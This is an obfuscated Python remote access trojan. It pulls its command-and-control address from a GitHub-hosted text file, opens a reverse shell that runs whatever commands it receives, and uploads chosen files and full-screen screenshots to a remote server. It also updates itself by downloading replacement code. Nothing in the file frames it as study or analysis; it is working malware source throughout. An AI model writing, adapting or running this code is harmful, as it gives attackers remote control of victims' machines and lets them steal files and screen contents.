import subprocess,socket,time,requests,os
from PIL import ImageGrab
KIZuJgxAD = "04.12.24.12"
osARNhaWpprtYXrmJDZRw = ""
IzPNgCXzfyMXIOMvHa = ""
XFGfDZZVdehwBRvp = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
BcYBxEB = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
jurfzmy = "!"
def tPfoNWlS(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def RivYaWAsXaLGDIYiArYp(s):
	LMrJbwfMYKrurW = s.recv(1024)
	if len(LMrJbwfMYKrurW)==0:
		return True
	kqQABpEOrUSeCxHM = LMrJbwfMYKrurW.decode("utf-8").replace("\n","")
	if not kqQABpEOrUSeCxHM.startswith(jurfzmy):
		proc = subprocess.run(kqQABpEOrUSeCxHM, shell=True, capture_output=True)
		sgCnvawVPFiECDRA = proc.stdout + proc.stderr
		s.send(sgCnvawVPFiECDRA)
		return
	fsUbycyugW = kqQABpEOrUSeCxHM.split(" ")[0][1:]
	if fsUbycyugW == "download":
		HNGkarGkKp(s, kqQABpEOrUSeCxHM)
	elif fsUbycyugW == "screenshot":
		qDhGlOsnDSicF(s)
def HNGkarGkKp(s, kqQABpEOrUSeCxHM):
	ujEYXEVLPXMeEbcKfD = kqQABpEOrUSeCxHM.replace(jurfzmy+"download ","").split(",")
	sgCnvawVPFiECDRAs = ""
	for f in ujEYXEVLPXMeEbcKfD:
		sgCnvawVPFiECDRAs += mxekrxThqkRWmdomPJaLXv(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(sgCnvawVPFiECDRAs, "utf-8"))
def qDhGlOsnDSicF(s):
	gVNHTOrQUrbzGMSrVnpjr = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	gVNHTOrQUrbzGMSrVnpjr.save(fpath)
	gVNHTOrQUrbzGMSrVnpjr.close()
	r = mxekrxThqkRWmdomPJaLXv(fpath, "api/sscap")
	os.remove(fpath)
	s.send(bytes(r,"utf-8"))
def mxekrxThqkRWmdomPJaLXv(zDdqYPRKUw, WvTjfvUhyzotZdbb, gcMdjRVU=None):
	if not os.path.exists(zDdqYPRKUw):
		return "[!] NOT FOUND: "+zDdqYPRKUw+"\n"
	headers = {"user":os.getlogin()}
	if gcMdjRVU is not None:
		headers = {**headers, **gcMdjRVU}
	requests.post("http://"+osARNhaWpprtYXrmJDZRw+":5555/"+WvTjfvUhyzotZdbb,
		files={"file":open(zDdqYPRKUw, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+zDdqYPRKUw+"\n"
def yuCeyoT():
	global osARNhaWpprtYXrmJDZRw, IzPNgCXzfyMXIOMvHa
	if osARNhaWpprtYXrmJDZRw == "" or IzPNgCXzfyMXIOMvHa == "":
		LMrJbwfMYKrurW = requests.get(XFGfDZZVdehwBRvp).text.replace("\n","").split(":")
		osARNhaWpprtYXrmJDZRw = LMrJbwfMYKrurW[0].strip()
		IzPNgCXzfyMXIOMvHa = LMrJbwfMYKrurW[1].strip()
		yKEYzgKRXirKwoeCKhyR = LMrJbwfMYKrurW[2].strip()
	return osARNhaWpprtYXrmJDZRw, IzPNgCXzfyMXIOMvHa, yKEYzgKRXirKwoeCKhyR
def kkwIBFKSZrSJFEBuFWE():
	PaDPcDfjXNSfdTJ = os.path.basename(__file__)
	fileType = PaDPcDfjXNSfdTJ.split(".")[-1]
	jQQvYIMbZkHArRGw = PaDPcDfjXNSfdTJ.replace("."+fileType,"") +"."+KIZuJgxAD + "."+fileType
	SQajOgVVZWhkuIMeCUcXFMT = os.path.join(os.getcwd(), jQQvYIMbZkHArRGw)
	with open(jQQvYIMbZkHArRGw, "w+") as f:
		f.write(requests.get(BcYBxEB+"file."+SQajOgVVZWhkuIMeCUcXFMT.split(".")[-1]).text)
	#if fileType == "exe":
	#	os.system(".\"+SQajOgVVZWhkuIMeCUcXFMT")
	#elif fileType.startswith("py"):
	#	os.system("python "+SQajOgVVZWhkuIMeCUcXFMT)
def PzRqwPKUt():
	pass
def BwEftCjWlAaJnHOuYCxP():
	h, p, v = yuCeyoT()
	if KIZuJgxAD != v:
		kkwIBFKSZrSJFEBuFWE()
	PzRqwPKUt()
	nSZQqSpHXPYRoIX = bytes("["+KIZuJgxAD+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				PSvunCpfAEbNNppoRkfYCqu=False
				try:
					s=tPfoNWlS(h, p)
					while not PSvunCpfAEbNNppoRkfYCqu:
						s.send(nSZQqSpHXPYRoIX)
						PSvunCpfAEbNNppoRkfYCqu=RivYaWAsXaLGDIYiArYp(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
BwEftCjWlAaJnHOuYCxP()
